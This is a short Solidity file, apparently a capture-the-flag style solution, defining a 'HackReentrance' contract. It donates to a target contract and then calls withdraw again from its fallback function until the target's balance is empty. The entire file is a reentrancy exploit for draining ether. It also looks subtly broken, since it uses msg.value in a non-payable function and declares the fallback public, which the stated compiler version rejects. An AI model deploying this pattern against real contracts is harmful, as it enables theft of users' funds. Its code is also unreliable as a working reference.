// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IReentrance {
  function donate(address _to) external payable;
  function withdraw(uint _amount) external;
}

contract HackReentrance {
  IReentrance public reentranceAddress;


  constructor(IReentrance _reentranceAddress) public payable {
    reentranceAddress = IReentrance(_reentranceAddress);
  }

  function becomeDonor() public {
    reentranceAddress.donate.value(msg.value)(address(this));
  }

  fallback() public payable {
    if(address(reentranceAddress).balance != 0){
      reentranceAddress.withdraw(msg.value);
    }
  }
}
